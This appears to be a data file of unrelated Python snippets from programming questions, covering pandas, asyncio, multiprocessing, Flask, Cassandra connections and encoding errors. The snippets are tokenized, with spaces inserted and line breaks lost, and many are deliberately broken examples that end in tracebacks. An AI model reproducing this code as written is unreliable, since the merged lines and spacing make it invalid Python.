in decode ( result , consumed ) = self._buffer_decode ( data , self.errors , final ) UnicodeDecodeError : 'utf-8 ' codec ca n't decode byte 0xd1 in position 0 : invalid continuation byte # gen_file.pyfrom random import randintLENGTH = 100SIZE = 100000def gen_word ( length ) : return `` .join ( chr ( randint ( ord ( ' а ' ) , ord ( ' я ' ) ) ) for _ in range ( length ) ) if __name__ == `` __main__ '' : with open ( 'input.txt ' , ' w ' ) as f : for _ in range ( SIZE ) : print ( gen_word ( LENGTH ) , file=f )"
"Dear John Smith , We received your last payment for $ 123.45 on 2/4/13 . We 'd like you to be aware of the following charges : $ 12.34 Spuznitz , LLC on 4/1 $ 43.21 1-800-FLOWERS on 4/2As always , you can view these transactions in our portal . Thank you for your business !"
"class Molecule : def __init__ ( self , Temperature , MolecularWeight , MolarVolume , *properties ) : self.Temperature = Temperature self.MolecularWeight = MolecularWeight self.MolarVolume = MolarVolume self . *properties = *properties"
"def _clean_dict ( d ) : return { k : v for k , v in d.items ( ) if v is not None } def _clean_dict ( d : Dict [ Any , Any ] ) - > Dict [ Any , Any ] : return { k : v for k , v in d.items ( ) if v is not None }"
"import string , itertoolsdef _group_by_alphabet_key ( elem ) : char = elem [ 0 ] .upper ( ) i = string.ascii_uppercase.index ( char ) if i > 19 : to_c = string.ascii_uppercase [ -1 ] ; from_c = string.ascii_uppercase [ 20 ] else : from_c = string.ascii_uppercase [ i/5*5 ] to_c = string.ascii_uppercase [ i/5*5 + 4 ] return `` % s - % s '' % ( from_c , to_c ) subgroups = itertools.groupby ( name_list , _group_by_alphabet_key )"
"import asyncioclass R99 : def __await__ ( self ) : loop = asyncio.get_event_loop ( ) fut = loop.create_future ( ) loop.call_later ( 0.5 , fut.set_result , 99 ) return fut.__await__ ( ) class R100 ( R99 ) : async def add1 ( self ) : v = await R99 ( ) # v = await super ( ) .__await__ ( ) # < == error return v + 1 def __await__ ( self ) : return self.add1 ( ) .__await__ ( ) async def test ( ) : print ( await R99 ( ) ) print ( await R100 ( ) ) asyncio.get_event_loop ( ) .run_until_complete ( test ( ) )"
"import numpy as npimport pandas as pddf = pd.DataFrame ( ) df [ 'dt ' ] = pd.date_range ( `` 2017-01-01 12:00 '' , `` 2017-01-01 12:30 '' , freq= '' 1min '' ) df [ 'val ' ] = np.random.choice ( xrange ( 1 , 100 ) , df.shape [ 0 ] ) dt val0 2017-01-01 12:00:00 331 2017-01-01 12:01:00 422 2017-01-01 12:02:00 443 2017-01-01 12:03:00 64 2017-01-01 12:04:00 705 2017-01-01 12:05:00 94*6 2017-01-01 12:06:00 42*7 2017-01-01 12:07:00 97*8 2017-01-01 12:08:00 129 2017-01-01 12:09:00 1110 2017-01-01 12:10:00 6611 2017-01-01 12:11:00 7112 2017-01-01 12:12:00 2513 2017-01-01 12:13:00 2314 2017-01-01 12:14:00 3915 2017-01-01 12:15:00 25 dt val5 2017-01-01 12:05:00 946 2017-01-01 12:06:00 427 2017-01-01 12:07:00 97"
"X = pd.DataFrame ( { `` t '' : [ 1,2,3,4,5 ] , '' A '' : [ 34,12,78,84,26 ] , `` B '' : [ 54,87,35,25,82 ] , `` C '' : [ 56,78,0,14,13 ] , `` D '' : [ 0,23,72,56,14 ] , `` E '' : [ 78,12,31,0,34 ] } ) X A B C D E t0 34 54 56 0 78 11 12 87 78 23 12 22 78 35 0 72 31 33 84 25 14 56 0 44 26 82 13 14 34 5 A B C D E t4 26 82 13 14 34 5 0 34 54 56 0 78 11 12 87 78 23 12 22 78 35 0 72 31 33 84 25 14 56 0 4 A B C D E t3 84 25 14 56 0 44 26 82 13 14 34 5 0 34 54 56 0 78 11 12 87 78 23 12 22 78 35 0 72 31 3"
./configure -- prefix=/my/local/dir -- exec-prefix=/my/local/dir -- enable-shared -- with-pydebugmakemake install
"> > > def foo ( ) : ... i = 1 ... class bar ( object ) : ... j = i ... return bar ... > > > dis ( foo ) 2 0 LOAD_CONST 1 ( 1 ) 3 STORE_DEREF 0 ( i ) 3 6 LOAD_CONST 2 ( 'bar ' ) 9 LOAD_GLOBAL 0 ( object ) 12 BUILD_TUPLE 1 15 LOAD_CLOSURE 0 ( i ) 18 BUILD_TUPLE 1 21 LOAD_CONST 3 ( < code object bar at 0xb74f8800 , file `` < stdin > '' , line 3 > ) 24 MAKE_CLOSURE 0 27 CALL_FUNCTION 0 30 BUILD_CLASS 31 STORE_FAST 0 ( bar ) 5 34 LOAD_FAST 0 ( bar ) 37 RETURN_VALUE 15 LOAD_CLOSURE 0 ( i ) 18 BUILD_TUPLE 1 21 LOAD_CONST 3 ( < code object bar at 0xb74f8800 , file `` < stdin > '' , line 3 > ) 24 MAKE_CLOSURE 0 27 CALL_FUNCTION 0 30 BUILD_CLASS"
"> > > '' \20 % '' '\x10 % ' > > > l = [ 'test ' , 'case ' ] > > > '' \20 % '' .join ( l ) 'test\x10 % case '"
"import functoolsclass K : @ functools.lru_cache ( maxsize=32 ) @ classmethod def mthd ( i , stryng : str ) : \ return stryngobj = K ( ) TypeError : the first argument must be callable"
# This unicode string is returned by the database > > > my_string = u'\u4157\u4347\u6e65\u6574\u2d72\u3430\u3931\u3530\u3731\u3539\u3533\u3631\u3630\u3530\u3330\u322d\u3130\u3036\u3036\u3135\u3432\u3538\u2d37\u3134\u3039\u352d ' # prints something in chineese > > > print my_string䅗䍇湥整⵲㐰㤱㔰㜱㔹㔳㘱㘰㔰㌰㈭㄰〶〶ㄵ㐲㔸ⴷㄴ〹㔭 > > > my_string.encode ( 'utf-16 ' ) '\xff\xfeWAGCenter-04190517953516060503-20160605124857-4190-5 ' > > > print my_string.encode ( 'utf-16 ' ) ��WAGCenter-04190517953516060503-20160605124857-4190-5 WAGCenter-04190517953516060503-20160605124857-4190-51 > > > print t.encode ( 'utf-16-le ' ) WAGCenter-04190517953516060503-20160605124857-4190-5
"import restring = 'uiae1iuae200 ' # the string to investigatelen ( string ) - re.search ( r ' [ ^0-9 ] ' , string [ : :-1 ] ) .start ( )"
"Notebook validation failed : [ 'outputPrepend ' , 'outputPrepend ' , 'outputPrepend ' , 'outputPrepend ' , 'outputPrepend ' , 'outputPrepend ' , 'outputPrepend ' , 'outputPrepend ' , 'outputPrepend ' , 'outputPrepend ' , 'outputPrepend ' , 'outputPrepend ' ] has non-unique elements : [ `` outputPrepend '' , `` outputPrepend '' , `` outputPrepend '' , `` outputPrepend '' , `` outputPrepend '' , `` outputPrepend '' , `` outputPrepend '' , `` outputPrepend '' , `` outputPrepend '' , `` outputPrepend '' , `` outputPrepend '' , `` outputPrepend '' ] nbconvert failed : [ 'outputPrepend ' , 'outputPrepend ' , 'outputPrepend ' , 'outputPrepend ' , 'outputPrepend ' , 'outputPrepend ' , 'outputPrepend ' , 'outputPrepend ' , 'outputPrepend ' , 'outputPrepend ' , 'outputPrepend ' , 'outputPrepend ' ] has non-unique elementsFailed validating 'uniqueItems ' in code_cell [ 'properties ' ] [ 'metadata ' ] [ 'properties ' ] [ 'tags ' ] : On instance [ 'cells ' ] [ 70 ] [ 'metadata ' ] [ 'tags ' ] : [ 'outputPrepend ' , 'outputPrepend ' , 'outputPrepend ' , 'outputPrepend ' , 'outputPrepend ' , 'outputPrepend ' , 'outputPrepend ' , 'outputPrepend ' , 'outputPrepend ' , 'outputPrepend ' , 'outputPrepend ' , 'outputPrepend ' ]"
"tuple ( thing for thing in things ) tuple ( [ thing for thing in things ] ) * ( thing for thing in things ) , > > > from timeit import timeit > > > a = 'tuple ( i for i in range ( 10000 ) ) ' > > > b = 'tuple ( [ i for i in range ( 10000 ) ] ) ' > > > c = '* ( i for i in range ( 10000 ) ) , ' > > > print ( ' A : ' , timeit ( a , number=1000000 ) ) > > > print ( ' B : ' , timeit ( b , number=1000000 ) ) > > > print ( ' C : ' , timeit ( c , number=1000000 ) ) A : 438.98362647295824B : 271.7554752581845C : 455.59842588083677"
"return super ( HMM , self ) ( PriorProbs ) super ( HMM , self )"
if session [ 'dp ' ] : = current_user.avatar : ^ SyntaxError : can not use assignment expressions with subscript
"from gensim.models import Doc2Vecfrom gensim.models.doc2vec import TaggedLineDocumentimport datetimeprint ( 'Creating documents ' , datetime.datetime.now ( ) .time ( ) ) context = TaggedLineDocument ( './test_data/context.csv ' ) print ( 'Building model ' , datetime.datetime.now ( ) .time ( ) ) model = Doc2Vec ( context , size = 200 , window = 10 , min_count = 10 , workers=4 ) print ( 'Training ... ' , datetime.datetime.now ( ) .time ( ) ) for epoch in range ( 10 ) : print ( 'Run number : ' , epoch ) model.train ( context ) model.save ( './test_data/model ' )"
"from Tkinter import *import ttkroot = Tk ( ) nb = ttk.Notebook ( root , width=320 , height=240 ) nb.pack ( fill=BOTH , expand=1 ) page0 = Frame ( nb ) page1 = Frame ( nb ) page2 = Frame ( nb ) page3 = Frame ( nb ) page4 = Frame ( nb ) nb.add ( page0 , text= '' 0 '' ) nb.add ( page1 , text= '' 1 '' ) nb.add ( page2 , text= '' 2 '' ) nb.add ( page3 , text= '' 3 '' ) nb.add ( page4 , text= '' 4 '' ) root.mainloop ( )"
"authenticator : com.datastax.bdp.cassandra.auth.DseAuthenticatorauthorizer : com.datastax.bdp.cassandra.auth.DseAuthorizer import pycassaURIPORTLIST = [ '12345.mycompany.net:9420 ' ] pool = pycassa.ConnectionPool ( 'my_keyspace ' , server_list=URIPORTLIST , credentials= { 'USERNAME ' : 'fancycar ' , 'PASSWORD ' : 'becauseimbatman ' } , prefill=False ) cf = pycassa.ColumnFamily ( pool , 'my_table ' ) AllServersUnavailable : An attempt was made to connect to each of the servers twice , but none of the attempts succeeded . The last failure was TTransportException : Could not connect to 12345.mycompany.net:9420 from dse.cluster import Clusterauth_provider = PlainTextAuthProvider ( username='fancycar ' , password='becauseimbatman ' ) cluster = Cluster ( [ '12345.mycompany.net ' ] , port=9042 , auth_provider=auth_provider ) session = cluster.connect ( 'my_keyspace ' ) NoHostAvailable : ( 'Unable to connect to any servers ' , { '11.111.11.1 ' : AuthenticationFailed ( 'Failed to authenticate to 11.111.11.2 : Error from server : code=0100 [ Bad credentials ] message= '' Failed to login . Please re-try . `` ' , ) } )"
"from os import statdef chunkify ( pfin , buf_size=1024 ) : file_end = stat ( pfin ) .st_size with open ( pfin , 'rb ' ) as f : chunk_end = f.tell ( ) while True : chunk_start = chunk_end f.seek ( buf_size , 1 ) f.readline ( ) chunk_end = f.tell ( ) yield chunk_start , chunk_end - chunk_start if chunk_end > file_end : breakdef process_batch ( pfin , chunk_start , chunk_size ) : with open ( pfin , ' r ' , encoding='utf-8 ' ) as f : f.seek ( chunk_start ) batch = f.read ( chunk_size ) .splitlines ( ) # changing this to batch [ : -1 ] will result in 26 lines total return batchif __name__ == '__main__ ' : fin = r'data/tiny.txt ' lines_n = 0 for start , size in chunkify ( fin ) : lines = process_batch ( fin , start , size ) # Uncomment to see broken lines # for line in lines : # print ( line ) # print ( '\n ' ) lines_n += len ( lines ) print ( lines_n ) # 29 She returned bearing mixed lessons from a society where the tools of democracy still worked.If you think you can sense a `` but '' approaching , you are right.Elsewhere , Germany take on Brazil and Argentina face Spain , possibly without Lionel Messi.What sort of things do YOU remember best ? 'Less than three weeks after taking over from Lotz at Wolfsburg.The buildings include the Dr. John Micallef Memorial Library.For women who do not have the genes , the risk drops to just 2 % for ovarian cancer and 12 % for breast cancer.In one interview he claimed it was from the name of the Cornish language ( `` Kernewek '' ) .8 Goldschmidt was out of office between 16 and 19 July 1970.Last year a new law allowed police to shut any bar based on security concerns.But , Frum explains : `` Glenn Beck takes it into his head that this guy is bad news . `` Carrying on the Romantic tradition of landscape painting.This area has miles of undeveloped beach adjacent to the headlands.The EAC was created in 2002 to help avoid a repeat of the disputed 2000 presidential election.In May 1945 , remnants of the German Army continue fight on in the Harz mountains , nicknamed `` The Void '' by American troops.Dietler also said Abu El Haj was being opposed because she is of Palestinian descent.The auction highlights AstraZeneca 's current focus on boosting returns to shareholders as it heads into a wave of patent expiries on some of its biggest selling medicines including Nexium , for heartburn and stomach ulcers , and Seroquel for schizophrenia and bipolar disorder.GAAP operating profit was $ 13.2 million and $ 7.1 million in the second quarter of 2008 and 2007 , respectively.Doc , Ira , and Rene are sent home as part of the seventh bond tour.only I am sick of always hearing him called the Just.Also there is Meghna River in the west of Brahmanbaria.The explosives were the equivalent of more than three kilograms of dynamite - equal to 30 grenades , '' explained security advisor Markiyan Lubkivsky to reporters gathered for a news conference in Kyiv.Her mother first took her daughter swimming at the age of three to help her with her cerebal palsy.A U.S. aircraft carrier , the USS `` Ticonderoga '' , was also stationed nearby.Louis shocked fans when he unexpectedly confirmed he was expecting a child in summer 2015.99 , pp.Sep 19 : Eibar ( h ) WON 6-1 ... This area has miles of undeveloped beach adjacent to the headlands.The EAC was created in 2002 to help avoid a repeat of the disputed 2000 presidential election.In May 1945 , rIn May 1945 , remnants of the German Army continue fight on in the Harz mountains , nicknamed `` The Void '' by American troops ... . from os import statfrom functools import partialdef chunkify ( pfin , max_lines=1500 ) : file_end = stat ( pfin ) .st_size with open ( pfin , ' r ' , encoding='utf-8 ' ) as f : chunk_end = f.tell ( ) for idx , l in enumerate ( iter ( f.readline , `` ) ) : if idx % max_lines == 0 : chunk_start = chunk_end chunk_end = f.tell ( ) # yield start position , size , and is_last yield chunk_start , chunk_end - chunk_start chunk_start = chunk_end yield chunk_start , file_enddef process_batch ( pfin , chunk_start , chunk_size ) : with open ( pfin , ' r ' , encoding='utf-8 ' ) as f : f.seek ( chunk_start ) chunk = f.read ( chunk_size ) .splitlines ( ) batch = list ( filter ( None , chunk ) ) return batchif __name__ == '__main__ ' : fin = r'data/100000-ep+gutenberg+news+wiki.txt ' process_func = partial ( process_batch , fin ) lines_n = 0 prev_last = `` for start , size in chunkify ( fin ) : lines = process_func ( start , size ) if not lines : continue # print first and last ten sentences of batch for line in lines [ :10 ] : print ( line ) print ( ' ... ' ) for line in lines [ -10 : ] : print ( line ) print ( '\n ' ) lines_n += len ( lines ) print ( lines_n ) ... The EC ordered the SFA to conduct probes by June 30 and to have them confirmed by a certifying authority or it would deduct a part of the funding or the entire sum from upcoming EU subsidy payments.Dinner for two , with wine , 250 lari.It lies a few kilometres north of the slightly higher Weissmies and also close to the slightly lower Fletschhorn on the north.For the rest we reached agreement and it was never by chance.Chicago Blackhawks defeat Columbus Blue Jackets for 50th winThe only drawback in a personality that large is that no one elsFor the rest we reached agreement and it was never by chance.Chicago Blackhawks defeat Columbus Blue Jackets for 50th winThe only drawback in a personality that large is that no one else , whatever their insights or artistic pedigree , is quite as interesting.Sajid Nadiadwala 's reboot version of his cult classic `` Judwaa '' , once again directed by David Dhawan titled `` Judwaa 2 '' broke the dry spell running at the box office in 2017.They warned that there will be a breaking point , although it is not clear what that would be ... . from os import statdef chunkify ( pfin , buf_size=1024 ) : file_end = stat ( pfin ) .st_size with open ( pfin , 'rb ' ) as f : chunk_end = f.tell ( ) while True : chunk_start = chunk_end f.seek ( buf_size , 1 ) chunk_end = f.tell ( ) is_last = chunk_end > = file_end # yield start position , size , and is_last yield chunk_start , chunk_end - chunk_start , is_last if is_last : breakdef process_batch ( pfin , chunk_start , chunk_size , is_last , leftover ) : with open ( pfin , ' r ' , encoding='utf-8 ' ) as f : f.seek ( chunk_start ) chunk = f.read ( chunk_size ) # Add previous leftover to current chunk chunk = leftover + chunk batch = chunk.splitlines ( ) batch = list ( filter ( None , batch ) ) # If this chunk is not the last one , # pop the last item as that will be an incomplete sentence # We return this leftover to use in the next chunk if not is_last : leftover = batch.pop ( -1 ) return batch , leftoverif __name__ == '__main__ ' : fin = r'ep+gutenberg+news+wiki.txt ' lines_n = 0 left = `` for start , size , last in chunkify ( fin ) : lines , left = process_batch ( fin , start , size , last , left ) if not lines : continue for line in lines : print ( line ) print ( '\n ' ) numberlines = len ( lines ) lines_n += numberlines print ( lines_n ) Traceback ( most recent call last ) : File `` chunk_tester.py '' , line 46 , in < module > lines , left = process_batch ( fin , start , size , last , left ) File `` chunk_tester.py '' , line 24 , in process_batch chunk = f.read ( chunk_size ) File `` lib\codecs.py '' , line 322 , in decode ( result , consumed ) = self._buffer_decode ( data , self.errors , final ) UnicodeDecodeError : 'utf-8 ' codec ca n't decode byte 0xa9 in position 0 : invalid start byte"
"data = np.array ( [ 75. , 49. , 80. , 87. , 99 . ] ) arr1 = np.array ( [ 'Bob ' , 'Joe ' , 'Mary ' , 'Ellen ' , 'Dick ' ] , dtype='|S5 ' ) arr2 = np.array ( [ 'Mary ' , 'Dick ' ] , dtype='|S5 ' ) TF = [ ] for i in arr1 : if i in arr2 : TF.append ( True ) else : TF.append ( False ) new_data = data [ TF ]"
# Calculate Calculusimport sympyx = sympy.Symbol ( ' x ' ) f = ( 6-x*x ) ** ( 1.5 ) f.integrate ( ) ValueError : gamma function pole f = ( 6-x*x ) ** ( 2 ) # result : x**5/5 - 4*x**3 + 36*x
"import numpy as npimport pandas as pdfrom numpy.lib.stride_tricks import as_stridedtest = [ [ x * y for x in range ( 1 , 10 ) ] for y in [ 10**z for z in range ( 5 ) ] ] mm = np.array ( test , dtype = np.int64 ) pp = pd.DataFrame ( test ) .values as_strided ( mm , ( mm.shape [ 0 ] - 3 + 1 , 3 , mm.shape [ 1 ] ) , ( mm.shape [ 1 ] * 8 , mm.shape [ 1 ] * 8 , 8 ) ) as_strided ( pp , ( pp.shape [ 0 ] - 3 + 1 , 3 , pp.shape [ 1 ] ) , ( pp.shape [ 1 ] * 8 , pp.shape [ 1 ] * 8 , 8 ) )"
"from flask import Flaskapp = Flask ( __name__ ) class Counter ( object ) : def __init__ ( self , app ) : print ( 'initializing a Counter object ' ) self.app = app self.value = 0 def increment ( self ) : self.value += 1 print ( 'Just incremented , current value is ' , self.value ) counter = Counter ( app ) @ app.route ( '/ ' ) def index ( ) : for i in range ( 4 ) : counter.increment ( ) return 'index'if __name__ == '__main__ ' : # scenario 1 - single process # app.run ( ) # scenario 2 - threaded # app.run ( threaded=True ) # scenario 3 - two processes app.run ( processes=2 ) initializing a Counter object * Running on http : //127.0.0.1:5000/ ( Press CTRL+C to quit ) Just incremented , current value is 1 Just incremented , current value is 2 Just incremented , current value is 3 Just incremented , current value is 4 127.0.0.1 - - [ 30/Aug/2015 09:47:25 ] `` GET / HTTP/1.1 '' 200 - Just incremented , current value is 1 Just incremented , current value is 2 Just incremented , current value is 3 Just incremented , current value is 4 127.0.0.1 - - [ 30/Aug/2015 09:47:26 ] `` GET / HTTP/1.1 '' 200 - Just incremented , current value is 1 Just incremented , current value is 2 Just incremented , current value is 3 Just incremented , current value is 4 127.0.0.1 - - [ 30/Aug/2015 09:47:27 ] `` GET / HTTP/1.1 '' 200 -"
"from multiprocessing import Poolimport timeimport sysdef testing ( number ) : count = 0 while True : print ( 'Count : { } '.format ( count ) ) count += 1 if count > number : print ( 'Exiting ... ' ) sys.exit ( ) else : print ( 'Looping Over ' ) time.sleep ( 1 ) if __name__ == '__main__ ' : with Pool ( 2 ) as p : p.map ( testing , [ 3 , 2 ] ) $ python3 test_exit.pyCount : 0Looping OverCount : 0Looping OverCount : 1Looping OverCount : 1Looping OverCount : 2Looping OverCount : 2Exiting ... < < < Exited 1st thread.Count : 3Exiting ... < < < Exited 2nd thread ... ..and it stays here as if stuck or something . It never gives control back to Shell . $ python3 test_exit.pyCount : 0Looping OverCount : 0Looping OverCount : 1Looping OverCount : 1Looping OverCount : 2Looping OverCount : 2Exiting ... Count : 3Exiting ... $ < < < Note : I am expecting to be dropped back to Shell prompt"
"tups = [ ( 1 , 2 ) , ( ' a ' , ' b ' ) , ( 3 , 4 ) , ( ' c ' , 5 ) , ( 6 , 'd ' ) , ( ' a ' , ' b ' ) , ( 3 , 4 ) ] [ 0 , 1 , 2 , 3 , 4 , 1 , 2 ] pd.factorize ( tups ) [ 0 ] -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -ValueError Traceback ( most recent call last ) < ipython-input-84-c84947ac948c > in < module > ( ) -- -- > 1 pd.factorize ( tups ) [ 0 ] //anaconda/envs/3.6/lib/python3.6/site-packages/pandas/core/algorithms.py in factorize ( values , sort , order , na_sentinel , size_hint ) 553 uniques = vec_klass ( ) 554 check_nulls = not is_integer_dtype ( original ) -- > 555 labels = table.get_labels ( values , uniques , 0 , na_sentinel , check_nulls ) 556 557 labels = _ensure_platform_int ( labels ) pandas/_libs/hashtable_class_helper.pxi in pandas._libs.hashtable.PyObjectHashTable.get_labels ( pandas/_libs/hashtable.c:21804 ) ( ) ValueError : Buffer has wrong number of dimensions ( expected 1 , got 2 ) np.unique ( tups , return_inverse=1 ) [ 1 ] array ( [ 0 , 1 , 6 , 7 , 2 , 3 , 8 , 4 , 5 , 9 , 6 , 7 , 2 , 3 ] ) pd.factorize ( [ hash ( t ) for t in tups ] ) [ 0 ] array ( [ 0 , 1 , 2 , 3 , 4 , 1 , 2 ] ) lst = [ 10 , 7 , 4 , 33 , 1005 , 7 , 4 ] % timeit pd.factorize ( lst * 1000 ) [ 0 ] 1000 loops , best of 3 : 506 µs per loop % timeit pd.factorize ( [ hash ( i ) for i in lst * 1000 ] ) [ 0 ] 1000 loops , best of 3 : 937 µs per loop from itertools import countdef champ ( tups ) : d = { } c = count ( ) return np.array ( [ d [ tup ] if tup in d else d.setdefault ( tup , next ( c ) ) for tup in tups ] ) def root ( tups ) : return pd.Series ( tups ) .factorize ( ) [ 0 ] def iobe ( tups ) : return np.unique ( tups , return_inverse=True , axis=0 ) [ 1 ] def get_row_view ( a ) : void_dt = np.dtype ( ( np.void , a.dtype.itemsize * np.prod ( a.shape [ 1 : ] ) ) ) a = np.ascontiguousarray ( a ) return a.reshape ( a.shape [ 0 ] , -1 ) .view ( void_dt ) .ravel ( ) def diva ( tups ) : return np.unique ( get_row_view ( np.array ( tups ) ) , return_inverse=1 ) [ 1 ] def gdib ( tups ) : return pd.factorize ( [ str ( t ) for t in tups ] ) [ 0 ] from string import ascii_lettersdef tups_creator_1 ( size , len_of_str=3 , num_ints_to_choose_from=1000 , seed=None ) : c = len_of_str n = num_ints_to_choose_from np.random.seed ( seed ) d = pd.DataFrame ( np.random.choice ( list ( ascii_letters ) , ( size , c ) ) ) .sum ( 1 ) .tolist ( ) i = np.random.randint ( n , size=size ) return list ( zip ( d , i ) ) results = pd.DataFrame ( index=pd.Index ( [ 100 , 1000 , 5000 , 10000 , 20000 , 30000 , 40000 , 50000 ] , name='Size ' ) , columns=pd.Index ( 'champ root iobe diva gdib'.split ( ) , name='Method ' ) ) for i in results.index : tups = tups_creator_1 ( i , max ( 1 , int ( np.log10 ( i ) ) ) , max ( 10 , i // 10 ) ) for j in results.columns : stmt = ' { } ( tups ) '.format ( j ) setup = 'from __main__ import { } , tups'.format ( j ) results.set_value ( i , j , timeit ( stmt , setup , number=100 ) / 100 ) results.plot ( title='Avg Seconds ' , logx=True , logy=True )"
"from itertools import count , permutationsall_permutations = permutations ( count ( 1 ) , 4 ) 1 2 3 41 2 4 3 ... 4 3 2 11 2 3 51 2 5 3 ... 5 3 2 11 2 4 51 2 5 4 ..."
# class A ( object ) : # def blah ( self ) : # pass # class A ( object ) : # def blah ( self ) : # pass
